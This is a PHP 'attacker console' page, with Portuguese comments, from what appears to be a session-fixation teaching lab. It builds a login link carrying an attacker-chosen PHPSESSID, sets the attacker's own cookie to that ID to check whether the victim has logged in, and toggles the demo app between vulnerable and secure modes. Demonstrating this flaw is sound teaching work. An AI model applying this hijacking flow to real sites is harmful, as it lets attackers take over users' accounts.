<?php

// Ação "verificar": o atacante força seu próprio navegador a usar o Session
// ID que ele fixou na vítima, antes de iniciar qualquer sessão própria.
if (isset($_GET['verificar'], $_GET['sid'])) {
    setcookie(session_name(), $_GET['sid'], ['path' => '/']);
    header('Location: account.php');
    exit;
}

session_start();

if ($_SERVER['REQUEST_METHOD'] === 'POST' && ($_POST['acao'] ?? '') === 'toggle_modo') {
    setModo(isset($_POST['modo_seguro']) ? MODE_SEGURO : MODE_VULNERAVEL);
    header('Location: attacker.php');
    exit;
}

if (empty($_SESSION['id_fixo'])) {
    $_SESSION['id_fixo'] = 'ATACANTE-' . bin2hex(random_bytes(4));
}

$idFixo = $_SESSION['id_fixo'];
$esquema = ($_SERVER['HTTPS'] ?? '') !== '' && $_SERVER['HTTPS'] !== 'off' ? 'https://' : 'http://';
$baseUrl = $esquema . $_SERVER['HTTP_HOST'];
$linkMalicioso = $baseUrl . '/login.php?PHPSESSID=' . urlencode($idFixo);
$linkVerificar = 'attacker.php?verificar=1&sid=' . urlencode($idFixo);
$modo = getModo();

render_header('Console do Atacante');
?>
<div class="card">
    <h2>1. Escolha o modo do app alvo</h2>
    <form method="post">
        <input type="hidden" name="acao" value="toggle_modo">
        <label>
            <input type="checkbox" name="modo_seguro" value="1"
                <?= $modo === MODE_SEGURO ? 'checked' : '' ?>
                onchange="this.form.submit()">
            Modo seguro (o app regenera o Session ID no login)
        </label>
    </form>
</div>

<div class="card">
    <h2>2. Envie este link para a vítima</h2>
    <p>O link já contém o Session ID que você escolheu para ela usar:</p>
    <p class="link-malicioso"><?= htmlspecialchars($linkMalicioso) ?></p>
    <p style="font-size:0.85rem;color:#6b6b70">
        Abra esse link numa janela anônima/outro navegador pra simular a vítima.
    </p>
</div>

<div class="card">
    <h2>3. Verifique se a vítima já logou</h2>
    <p>Seu ID fixado: <code><?= htmlspecialchars($idFixo) ?></code></p>
    <a class="btn" href="<?= htmlspecialchars($linkVerificar) ?>">Verificar se a vítima logou</a>
</div>

<div class="card">
    <a class="btn secondary" href="reset.php">Gerar novo ataque</a>
</div>
<?php
render_footer();
